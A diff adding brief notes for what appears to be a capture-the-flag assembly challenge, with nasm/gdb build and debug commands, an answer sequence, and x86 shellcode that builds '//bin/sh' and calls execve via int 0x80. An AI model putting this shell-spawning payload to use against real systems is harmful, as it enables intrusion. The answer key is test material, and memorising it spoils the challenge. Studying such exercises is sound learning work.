@@ -1,0 +1,51 @@
+- using command to construct, build, and run the asm file
+    - nasm -f elf32 input.s && ./ld -m elf_i386 -o a.bin input.o && ./a.bin
+    - gdb ./a.bin
+        - b _start
+        - layout asm
+        - run
+        - si
+        - info register
+        - C-L or refresh
+
+- answer
+    - 1,10,9,7,7,12,4,2,2,8,8,8,8,8,0
+```
+global  _start
+section .text
+_start:
+        pop ebx
+        pop ebp
+        xor eax,eax
+        push 0x68732f6e
+        push 0x69622f2f
+        push esp
+        push ebp
+        add ecx,eax
+        pop ebx
+        add ecx,eax
+        pop ebx
+        push 1
+        push 2
+        pop ecx
+        pop eax
+        sub ecx,eax
+        pop ebp
+        sub ecx,eax
+        pop ebp
+        add eax,0x2
+        add eax,0x2
+        add eax,0x2
+        add eax,0x2
+        add eax,0x2
+        int 0x80
+        pop ebp
+        pop edi
+        pop esi
+        pop ebx
+```
+
+- refs
+    - https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/4
+    - http://www.cs.virginia.edu/~evans/cs216/guides/x86.html
+    - http://syscalls.kernelgrok.com/
